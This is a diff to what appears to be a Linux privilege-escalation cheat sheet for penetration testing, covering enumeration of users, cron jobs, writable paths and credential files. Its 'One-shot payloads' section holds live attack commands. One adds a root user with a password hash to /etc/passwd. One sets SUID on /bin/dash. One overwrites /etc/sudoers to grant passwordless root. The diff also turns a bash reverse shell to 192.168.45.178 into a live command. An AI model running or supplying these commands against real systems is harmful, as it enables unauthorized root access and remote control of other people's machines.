@@ -13,6 +13,7 @@ stty columns 200 rows 200
 
 # Basic
 id ; env ; hostname ; /etc/issue ; /etc/os-release ; uname -a ;
+systemctl show-environment # show system path
 
 # Users
 getent passwd | grep -v 'sshd' | grep 'sh\|:0:' --color
@@ -40,23 +41,15 @@ crontab -l -u $user
 ll -R /etc/cron* /var/spool/cron*
 cat /etc/cron* /etc/cron*/* /var/spool/cron/* /var/spool/cron/*/*
 
-# World writable notes
-find / -writable -type d 2>/dev/null
-find / -writable -type f 2>/dev/null
+# Writable files and directories
+ll -d $(find . -writable 2>/dev/null)
+ll -d $(find . -writable -user $(whoami) 2>/dev/null)
+ll -d $(find . -writable -group $(whoami) 2>/dev/null)
 
-# World executable folder
-find / -perm -o x -type d 2>/dev/null
-
-# World writable and executable folders
-find / \( -perm -o w -perm -o x \) -type d 2>/dev/null
-find / \( -perm -o w -perm -o x \) -type f 2>/dev/null
-
-# Find writable files and directories
-find / -type d -writable -user $(whoami) 2>/dev/null
-find / -type d -writable -group alice 2>/dev/null
-
-find / -type f -writable -user $(whoami) 2>/dev/null
-find / -type f -writable -group groupname 2>/dev/null
+# Executable files and directories
+ll -d $(find . -executable 2>/dev/null)
+ll -d $(find . -executable -user $(whoami) 2>/dev/null)
+ll -d $(find . -executable -group $(whoami) 2>/dev/null)
 
 # Outdated software
 apt list --upgradable
@@ -67,17 +60,14 @@ lsmod
 # File Enumeration
 ll /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
 
-# Git repos
-find / -type d -name ".git" 2>/dev/null
-
 # MySQL
 mysql --version
 
-# One-shot payloads
+# One-shot payloads injects
 echo "w00t:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash" >> /etc/passwd
 chmod 4777 /bin/dash ; /bin/dash -p
-echo “$user ALL=(root) NOPASSWD: ALL” > /etc/sudoers
-echo 'bash -i >& /dev/tcp/192.168.45.178/80 0>&1'
+echo “apache ALL=(root) NOPASSWD: ALL” > /etc/sudoers
+bash -i >& /dev/tcp/192.168.45.178/80 0>&1
 
 # File enumeration
 grep "CRON" /var/log/syslog
@@ -100,9 +90,11 @@ ll /home /root /etc/ssh /home/*/.ssh/; locate id_rsa; locate id_dsa; find / -nam
 
 # Modified in last 10 minutes
 find / -type f -mmin -10 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/var/lib/*" ! -path "/private/var/*" -printf '%T+ %p\n' 2>/dev/null | head -100 | sort -r
-find . -iregex ".*\.kdbx\|.*\.ini\|.*\.conf\|.*\.cnf\|.*\.config.*\|.*\.db\|.*\.yml\|.*\.yaml\|.*\.txt\|.*\.xml\|.*\.json\|.*\.dat\|.*\.secrets\|.*\..*rc\|.*\.env.*\|.*\.bak\|.*\.inf\|.*\.sql.*\|.*\.key\|.*\.sav\|.*\.log\|.*\.settings\|.*\.vcl\|.*conf.*\.php.*\|.*admin.*\.php\|database\.php\|db\.php\|storage\.php\|settings\.php\|installer\.php\|config\.inc\.php\|.*pass.*\.php"
-2>/dev/null | grep -Ev "\.conda\|pip"
 
+# Interesting files, add other programs such as pl,go,..
+ll -d $(find /var/www -iregex '.*site-packages.*\|^.*/\.cargo.*\|.*stable-x86_64.*' -prune -o -iregex ".*\.kdbx\|.*\.ini\|.*\.conf\|.*\.cnf\|.*\.config.*\|.*\.db\|.*\.y*ml\|.*\.txt\|.*\.xml\|.*\.json\|.*\.dat\|.*\.secrets\|.*\..*rc\|.*\.env.*\|.*\.bak\|.*\.inf\|.*\.sql.*\|.*\.key\|.*\.sav\|.*\.log\|.*\.settings\|.*\.vcl\|.*conf.*\.php.*\|.*admin.*\.php\|database\.php\|db\.php\|storage\.php\|settings\.php\|installer\.php\|config\.inc\.php\|.*pass.*\.php\|.*\..*sh\|.*\.py\|^.*/\.[^/]*$" 2>/dev/null)
+ll -d $(find /home -iregex ".*\.kdbx\|.*\.ini\|.*\.conf\|.*\.cnf\|.*\.config.*\|.*\.db\|.*\.yml\|.*\.yaml\|.*\.txt\|.*\.xml\|.*\.json\|.*\.dat\|.*\.secrets\|.*\..*rc\|.*\.env.*\|.*\.bak\|.*\.inf\|.*\.sql.*\|.*\.key\|.*\.sav\|.*\.log\|.*\.settings\|.*\.vcl\|.*conf.*\.php.*\|.*admin.*\.php\|database\.php\|db\.php\|storage\.php\|settings\.php\|installer\.php\|config\.inc\.php\|.*pass.*\.php\|.*\..*sh\|.*\.py\|^.*/\.[^/]*$" 2>/dev/null) | grep -Ev "\.conda\|pip"
+# seems to pick up every php file
 
 # What's been modified after..
 touch -t 202401031231.43 /tmp/wotsit
